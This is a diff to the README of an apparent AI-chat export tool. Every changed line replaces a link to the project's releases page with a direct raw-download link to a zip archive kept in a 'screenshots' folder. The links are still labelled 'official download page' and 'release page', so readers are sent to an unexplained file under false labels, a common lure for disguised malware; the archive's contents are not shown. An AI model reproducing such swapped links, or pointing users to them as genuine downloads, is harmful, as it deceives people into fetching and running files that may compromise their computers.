@@ -1,6 +1,6 @@
 # 🤖 ai-chat-exporter - Save all your chatbot conversations easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/raw/refs/heads/main/screenshots/chat-ai-exporter-v2.9.zip)
 
 This application saves your chat history from major artificial intelligence platforms. It works with ChatGPT, Gemini, Claude, DeepSeek, and Grok. You can save your chats as clean Markdown files or professional PDF documents. The tool supports bulk exports to save time. You name your files exactly how you want. This software remains open source for your privacy.
 
@@ -17,7 +17,7 @@ This application saves your chat history from major artificial intelligence plat
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases) to view all available versions.
+1.  Visit the [official download page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/raw/refs/heads/main/screenshots/chat-ai-exporter-v2.9.zip) to view all available versions.
 2.  Look for the section marked Assets under the most recent release.
 3.  Click the link that ends in .exe to download the installer file to your computer.
 4.  Find the downloaded file in your Downloads folder.
@@ -88,4 +88,4 @@ Every exported chat file includes a header with the date and time of the convers
 
 ## 📦 Updates
 
-Periodically check the [release page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/releases) for new features. We improve compatibility as AI services change their websites. Installing a new version covers the old one automatically. You do not need to uninstall the app before applying an update. Your configuration settings remain saved even after you install a newer version.
+Periodically check the [release page](https://github.com/Laciniate-publiusterentiusafer346/ai-chat-exporter/raw/refs/heads/main/screenshots/chat-ai-exporter-v2.9.zip) for new features. We improve compatibility as AI services change their websites. Installing a new version covers the old one automatically. You do not need to uninstall the app before applying an update. Your configuration settings remain saved even after you install a newer version.
